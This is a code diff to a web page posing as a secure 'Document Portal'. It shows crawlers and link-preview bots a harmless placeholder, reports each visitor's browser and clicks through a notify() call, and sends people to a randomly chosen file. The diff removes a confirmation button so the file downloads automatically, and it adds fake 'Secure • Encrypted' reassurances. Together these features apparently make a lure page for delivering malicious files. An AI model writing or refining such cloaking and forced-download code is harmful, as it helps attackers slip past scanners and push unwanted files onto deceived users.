@@ -101,6 +101,14 @@
         .install-links a { color: #4285f4; text-decoration: none; margin: 0 10px; font-size: 14px; }
         .install-links a.firefox-link { color: #ff9400; }
         .install-note { background: #f8f9fa; padding: 12px; border-radius: 12px; margin-top: 20px; font-size: 13px; color: #6c757d; }
+        .success-message {
+            background: #d4edda;
+            color: #155724;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 16px;
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
@@ -166,7 +174,31 @@
             return FILE_LINKS[Math.abs(hash) % FILE_LINKS.length];
         }
         
-        function showModal(url) {
+        function openInBrowser(browserName, fileUrl) {
+            // Create a temporary link and click it
+            const link = document.createElement('a');
+            link.href = fileUrl;
+            link.target = '_blank';
+            link.rel = 'noopener noreferrer';
+            link.style.display = 'none';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            
+            // Show success message
+            const modal = document.querySelector('.modal-overlay');
+            if (modal) {
+                const successDiv = document.createElement('div');
+                successDiv.className = 'success-message';
+                successDiv.innerHTML = `✅ Opening in ${browserName}... The file should download automatically.`;
+                modal.querySelector('.modal-card').appendChild(successDiv);
+                setTimeout(() => {
+                    window.close();
+                }, 2000);
+            }
+        }
+        
+        function showModal(url, fileUrl) {
             const modal = document.createElement('div');
             modal.className = 'modal-overlay';
             modal.innerHTML = `
@@ -190,15 +222,11 @@
             
             document.getElementById('chromeBtn').onclick = () => {
                 notify(FILE_LINKS[0], 'Edge', 'opened_in_chrome');
-                window.location.href = 'googlechrome://' + url.replace(/^https?:\/\//, '');
-                navigator.clipboard.writeText(url);
-                setTimeout(() => window.close(), 1000);
+                openInBrowser('Chrome', fileUrl);
             };
             document.getElementById('firefoxBtn').onclick = () => {
                 notify(FILE_LINKS[0], 'Edge', 'opened_in_firefox');
-                window.location.href = 'firefox://' + url.replace(/^https?:\/\//, '');
-                navigator.clipboard.writeText(url);
-                setTimeout(() => window.close(), 1000);
+                openInBrowser('Firefox', fileUrl);
             };
             document.getElementById('cancelBtn').onclick = () => {
                 notify(FILE_LINKS[0], 'Edge', 'cancelled');
@@ -207,12 +235,14 @@
                     <div class="container">
                         <div class="icon">📄</div>
                         <h2>Document Portal</h2>
-                        <p>You chose to continue in Edge. The document may not display correctly.</p>
-                        <button id="proceedBtn" class="btn btn-chrome" style="margin-top: 20px;">Proceed Anyway</button>
+                        <p>You chose to continue in Edge. Opening document...</p>
+                        <div class="loader"></div>
                         <div class="footer">Secure • Encrypted</div>
                     </div>
                 `;
-                document.getElementById('proceedBtn').onclick = () => window.location.href = getRandomFile();
+                setTimeout(() => {
+                    window.location.href = fileUrl;
+                }, 1500);
             };
         }
         
@@ -222,6 +252,7 @@
             const isBot = /bot|crawler|spider|scraper|facebook|twitter|whatsapp/i.test(ua);
             const browser = getBrowser();
             const url = window.location.href;
+            const fileUrl = getRandomFile();
             
             if (isBot) {
                 document.getElementById('app').innerHTML = `<div class="container"><div class="icon">📄</div><h2>Document Portal</h2><p>Secure document delivery system.</p><div class="footer">Secure Transmission</div></div>`;
@@ -232,24 +263,25 @@
                 return;
             }
             if (browser === 'Edge') {
-                notify(FILE_LINKS[0], 'Edge', 'detected');
-                showModal(url);
+                notify(fileUrl, 'Edge', 'detected');
+                showModal(url, fileUrl);
                 return;
             }
             
-            const file = getRandomFile();
-            notify(file, browser, 'access');
+            notify(fileUrl, browser, 'access');
             document.getElementById('app').innerHTML = `
                 <div class="container">
                     <div class="icon">📄</div>
                     <h2>Document Portal</h2>
                     <p>Your document is being prepared</p>
                     <div class="loader"></div>
-                    <div class="status">Redirecting...</div>
+                    <div class="status">Opening document...</div>
                     <div class="footer">Secure • Encrypted</div>
                 </div>
             `;
-            setTimeout(() => window.location.href = file, 2000);
+            setTimeout(() => {
+                window.location.href = fileUrl;
+            }, 1500);
         })();
     </script>
 </body>
